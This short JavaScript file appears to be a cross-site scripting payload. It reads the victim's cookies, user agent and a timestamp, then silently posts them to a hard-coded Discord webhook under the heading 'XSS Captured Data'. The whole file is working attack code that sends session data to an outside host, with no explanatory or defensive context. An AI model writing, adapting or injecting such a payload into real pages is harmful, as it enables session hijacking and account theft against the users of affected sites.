const webhookURL = "https://discord.com/api/webhooks/1387449374711218386/i0PvnyXDG58iIs2Tysg6vH1_BdRRIWuKhYZBrk5Aq3YDF47bqV2tryJ20fZI7hM79Hy3";
const cookies = document.cookie;
const userAgent = navigator.userAgent;
const timestamp = new Date().toISOString();
const payload = {
  content: "**XSS Captured Data**",
  embeds: [
    {
      title: "Session Information",
      color: 16711680,
      fields: [
        { name: "Cookies", value: cookies || "None", inline: false },
        { name: "User Agent", value: userAgent || "Unknown", inline: false },
        { name: "Timestamp", value: timestamp, inline: false }
      ]
    }
  ]
};
fetch(webhookURL, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(payload)
}).catch(() => {});
